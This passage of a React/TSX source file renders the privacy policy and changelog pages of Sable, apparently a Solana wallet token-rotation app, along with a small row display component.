      <p>The only personal data Sable collects is your <strong>wallet public key</strong> - the base-58 address you share when you connect your wallet. This is submitted to the Sable API to scan your on-chain token accounts and build transactions. Your public key is a public blockchain identifier by nature; it does not reveal your identity, location, or any off-chain information.</p>

      <h2>What we do not collect</h2>
      <p>Sable does not ask for or store your name, email address, phone number, IP address, or any government-issued identifier. We do not create user accounts. We do not track which pages you visit beyond what is necessary for the rotation flow. We do not use advertising networks, analytics platforms (including Google Analytics), or any third-party data brokers. We do not place persistent tracking cookies on your device.</p>

      <h2>Session data</h2>
      <p>Temporary session data - such as the list of token accounts returned by the RPC scan and the unsigned transactions built for your rotation - exists in memory on the Sable API server for the duration of your session only. This data is not written to any persistent database, is not shared with third parties, and is discarded when your session ends or after a short timeout.</p>

      <h2>Third-party services</h2>
      <p>Sable queries a Solana RPC provider (Helius) to read on-chain account data. Your wallet public key is sent to this provider as part of normal RPC operation. Helius operates under its own privacy policy. No other third-party services receive your wallet address or any other identifier.</p>

      <h2>Your rights and contact</h2>
      <p>Because we do not maintain accounts or persistent user records, there is no personal data to delete or export on request. If you have questions about this policy, contact <a href="mailto:security@sable.app">security@sable.app</a>.</p>
    </>
  );
}

function ChangelogPage() {
  return (
    <>
      <h1>Changelog</h1>
      <p>All notable changes to Sable are documented here. Dates are in ISO 8601 format.</p>

      <h2>v2.4.1 - 2026-11-01</h2>
      <ul>
        <li>Fixed a race condition in the blockhash retry loop that could cause the rotation to surface a stale-blockhash error on slow connections even after a successful internal retry. The retry window is now extended from 500 ms to 900 ms with a jittered backoff.</li>
        <li>Corrected the token account close instruction ordering for Token-2022 accounts with the TransferFee extension. Accounts are now closed after any pending withheld fees are harvested, preventing a residual dust balance from remaining on-chain.</li>
        <li>Improved error messages for wallet-rejection events: Backpack's cancellation message is now detected correctly and treated as a user-initiated cancel rather than a network error.</li>
      </ul>

      <h2>v2.4.0 - 2026-10-15</h2>
      <ul>
        <li>Redesigned the application layout to a full-width desktop-first grid. The hero headline and trust indicators now occupy a persistent left column, while the action card anchors the right column, giving the page a more finished, product-quality feel on larger screens.</li>
        <li>Reworked the wallet-selection modal: removed the conflicting blue radial gradient injected by the wallet adapter library, applied a dark glassy background consistent with the application shell, and increased touch-target sizes on individual wallet buttons to 56 px.</li>
        <li>Added hash-based client-side routing for the Docs, Security, Terms, Privacy, and Changelog pages. No router library is used; a small <code>useHashRoute</code> hook listens to the browser's native <code>hashchange</code> event.</li>
      </ul>

      <h2>v2.3.2 - 2026-09-28</h2>
      <ul>
        <li>Added full support for the Token-2022 program (Token Extensions). Accounts using the new program ID are now detected during the scan phase and included in the asset list alongside classic SPL Token accounts. Transfer and close instructions are routed to the correct program automatically.</li>
        <li>Introduced the OG image (<code>og.png</code>, 1200 x 630) for social-media link previews. The image is generated at build time from an SVG source using <code>sharp</code> and served as a static asset from the Vercel edge network.</li>
        <li>Switched the Vite project root to <code>type: module</code> and migrated all configuration files to ESM. The API server continues to run via <code>tsx</code> with <code>ts-node</code> resolution disabled to avoid CommonJS interop overhead at startup.</li>
      </ul>
    </>
  );
}

function Row(p: { icon: string; name: string; sub: string; value: string; note?: string }) {
  return (
    <div className="row">
      <div className="ic">{p.icon}</div>
      <div className="meta"><div className="nm">{p.name}</div><div className="sub">{p.sub}</div></div>
      <div className="val">{p.value}{p.note && <em>{p.note}</em>}</div>
      <div className="tick">v</div>
    </div>
  );
}
